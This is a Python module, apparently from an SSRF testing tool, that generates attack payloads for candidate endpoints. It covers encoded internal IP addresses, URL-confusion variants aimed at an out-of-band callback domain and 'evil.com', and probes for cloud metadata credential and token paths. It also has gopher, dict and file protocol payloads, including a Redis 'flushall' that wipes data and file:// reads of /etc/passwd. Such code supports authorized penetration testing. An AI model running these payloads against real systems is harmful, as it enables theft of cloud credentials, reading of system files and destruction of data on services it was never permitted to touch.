"""Payload generator for SSRF candidates.

Deterministic — no LLM calls. Generates payload variants:
  a) IP encoding variants (decimal, hex, octal, short, IPv6, IPv4-mapped IPv6)
  b) URL confusion (userinfo injection, scheme omit, fragment, case/dot tricks)
  c) Protocol variants (gopher, dict, file)

Every payload is tagged with its BypassTechnique(s) for report traceability.
"""

import uuid
from typing import Optional, List

from ..shared_types import (
    CandidateEndpoint,
    Payload,
    BypassTechnique,
    Protocol,
)
from .encoder import IpEncoder

# Common internal and cloud metadata addresses used for probe generation
_INTERNAL_ADDRESSES = [
    "127.0.0.1",
    "localhost",
    "0.0.0.0",
    "10.0.0.1",
    "172.16.0.1",
    "192.168.0.1",
    "192.168.1.1",
    "169.254.169.254",  # AWS IMDS
]

_CLOUD_METADATA_PATHS = [
    "/latest/meta-data/",
    "/latest/meta-data/iam/security-credentials/",
    "/metadata/instance?api-version=2021-02-01",
    "/computeMetadata/v1/instance/service-accounts/default/token",
]


class PayloadGenerator:
    """Generate SSRF payload variants for a candidate endpoint."""

    def __init__(self, oast_domain: str,
                 target_network_cidrs: Optional[List[str]] = None):
        """
        Args:
            oast_domain: OAST callback domain (e.g., abc123.interact.sh)
            target_network_cidrs: Target internal network CIDRs for probe generation
        """
        self.oast_domain = oast_domain
        self.target_cidrs = target_network_cidrs or ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]

    def generate(self, candidate: CandidateEndpoint) -> List[Payload]:
        """Generate all applicable payloads for a candidate endpoint."""
        payloads: List[Payload] = []

        payloads.extend(self._gen_oast_payloads(candidate))
        payloads.extend(self._gen_internal_probes(candidate))
        payloads.extend(self._gen_cloud_metadata_probes(candidate))
        payloads.extend(self._gen_protocol_variants(candidate))

        return payloads

    def generate_single(self, candidate: CandidateEndpoint,
                        technique: BypassTechnique) -> Optional[Payload]:
        """Generate a single payload for a specific bypass technique."""
        for p in self.generate(candidate):
            if technique in p.bypass_techniques:
                return p
        return None

    # ===== Internal generators =====

    def _gen_oast_payloads(self, candidate: CandidateEndpoint) -> List[Payload]:
        """Generate OAST callback payloads with various URL confusions."""
        results = []
        base = f"http://{self.oast_domain}"

        variants = [
            (base, [BypassTechnique.URL_SCHEME_OMIT], "Plain callback URL"),
            (f"//{self.oast_domain}", [BypassTechnique.URL_SCHEME_OMIT], "Protocol-relative URL"),
            (f"http://evil@{self.oast_domain}", [BypassTechnique.URL_USERINFO_INJECTION],
             "Userinfo injection (@)"),
            (f"http://{self.oast_domain}#@evil.com", [BypassTechnique.URL_FRAGMENT_CONFUSION],
             "Fragment confusion"),
            (f"http://{self.oast_domain}.", [BypassTechnique.URL_CASE_DOT_CONFUSION],
             "Trailing dot"),
            (f"HTTP://{self.oast_domain.upper()}", [BypassTechnique.URL_CASE_DOT_CONFUSION],
             "Uppercase scheme"),
        ]

        for value, techniques, desc in variants:
            results.append(Payload(
                id=f"oast-{uuid.uuid4().hex[:6]}",
                candidate_id=candidate.id,
                value=value,
                bypass_techniques=techniques,
                description=desc,
                target_protocol=Protocol.HTTP,
            ))

        return results

    def _gen_internal_probes(self, candidate: CandidateEndpoint) -> List[Payload]:
        """Generate internal IP probes with encoding variants."""
        results = []

        for addr in _INTERNAL_ADDRESSES:
            if not IpEncoder.is_valid_ipv4(addr):
                continue

            # Plain IP
            results.append(Payload(
                id=f"int-{uuid.uuid4().hex[:6]}",
                candidate_id=candidate.id,
                value=f"http://{addr}/",
                bypass_techniques=[],
                description=f"Internal probe: {addr}",
                target_protocol=Protocol.HTTP,
            ))

            # IP encoding variants
            encodings = [
                (IpEncoder.to_decimal(addr), BypassTechnique.IP_DECIMAL),
                (IpEncoder.to_hex(addr), BypassTechnique.IP_HEX),
                (IpEncoder.to_octal(addr), BypassTechnique.IP_OCTAL),
            ]

            short = IpEncoder.to_short_form(addr)
            if short != addr:
                encodings.append((short, BypassTechnique.IP_SHORT))

            for encoded, technique in encodings:
                results.append(Payload(
                    id=f"int-{uuid.uuid4().hex[:6]}",
                    candidate_id=candidate.id,
                    value=f"http://{encoded}/",
                    bypass_techniques=[technique],
                    description=f"Internal probe: {addr} via {technique.value}",
                    target_protocol=Protocol.HTTP,
                ))

            # IPv6 variants
            if addr == "127.0.0.1":
                results.append(Payload(
                    id=f"int-{uuid.uuid4().hex[:6]}",
                    candidate_id=candidate.id,
                    value=f"http://{IpEncoder.to_ipv6_loopback()}/",
                    bypass_techniques=[BypassTechnique.IPV6_FULL],
                    description="IPv6 loopback",
                    target_protocol=Protocol.HTTP,
                ))

            ipv6_mapped = IpEncoder.to_ipv4_mapped_ipv6(addr)
            results.append(Payload(
                id=f"int-{uuid.uuid4().hex[:6]}",
                candidate_id=candidate.id,
                value=f"http://[{ipv6_mapped}]/",
                bypass_techniques=[BypassTechnique.IPV4_MAPPED_IPV6],
                description=f"IPv4-mapped IPv6: {addr}",
                target_protocol=Protocol.HTTP,
            ))

        return results

    def _gen_cloud_metadata_probes(self, candidate: CandidateEndpoint) -> List[Payload]:
        """Generate cloud metadata endpoint probes."""
        results = []
        metadata_ip = "169.254.169.254"

        for path in _CLOUD_METADATA_PATHS:
            value = f"http://{metadata_ip}{path}"
            results.append(Payload(
                id=f"cloud-{uuid.uuid4().hex[:6]}",
                candidate_id=candidate.id,
                value=value,
                bypass_techniques=[],
                description=f"Cloud metadata probe: {path}",
                target_protocol=Protocol.HTTP,
            ))

            # Encoded variants for metadata IP
            encoded_ip = IpEncoder.to_decimal(metadata_ip)
            results.append(Payload(
                id=f"cloud-{uuid.uuid4().hex[:6]}",
                candidate_id=candidate.id,
                value=f"http://{encoded_ip}{path}",
                bypass_techniques=[BypassTechnique.IP_DECIMAL],
                description=f"Cloud metadata via decimal: {path}",
                target_protocol=Protocol.HTTP,
            ))

        return results

    def _gen_protocol_variants(self, candidate: CandidateEndpoint) -> List[Payload]:
        """Generate protocol variant payloads (gopher, dict, file)."""
        results = []

        # Gopher — often used for crafting raw TCP requests
        results.append(Payload(
            id=f"proto-{uuid.uuid4().hex[:6]}",
            candidate_id=candidate.id,
            value=f"gopher://127.0.0.1:25/_HELO%20localhost",
            bypass_techniques=[BypassTechnique.PROTOCOL_GOPHER],
            description="Gopher protocol probe (SMTP port)",
            target_protocol=Protocol.HTTP,
        ))

        results.append(Payload(
            id=f"proto-{uuid.uuid4().hex[:6]}",
            candidate_id=candidate.id,
            value=f"gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
            bypass_techniques=[BypassTechnique.PROTOCOL_GOPHER],
            description="Gopher protocol probe (Redis flushall)",
            target_protocol=Protocol.HTTP,
        ))

        # Dict — often used for port scanning / service enumeration
        results.append(Payload(
            id=f"proto-{uuid.uuid4().hex[:6]}",
            candidate_id=candidate.id,
            value=f"dict://127.0.0.1:6379/info",
            bypass_techniques=[BypassTechnique.PROTOCOL_DICT],
            description="Dict protocol probe (Redis info)",
            target_protocol=Protocol.HTTP,
        ))

        # File — read local files
        paths = ["/etc/passwd", "/etc/hosts", "c:/windows/win.ini"]
        for fp in paths:
            results.append(Payload(
                id=f"proto-{uuid.uuid4().hex[:6]}",
                candidate_id=candidate.id,
                value=f"file://{fp}",
                bypass_techniques=[BypassTechnique.PROTOCOL_FILE],
                description=f"File protocol probe: {fp}",
                target_protocol=Protocol.HTTP,
            ))

        return results
